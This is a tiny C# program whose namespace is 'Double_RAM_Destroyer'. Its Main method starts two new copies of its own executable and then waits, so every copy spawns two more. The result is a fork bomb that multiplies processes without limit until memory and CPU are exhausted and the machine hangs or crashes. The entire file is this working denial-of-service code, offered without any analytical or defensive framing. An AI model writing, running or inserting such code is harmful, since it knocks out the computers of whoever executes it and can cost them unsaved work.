using System;

namespace Double_RAM_Destroyer
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
            Console.ReadLine();
        }
    }
}
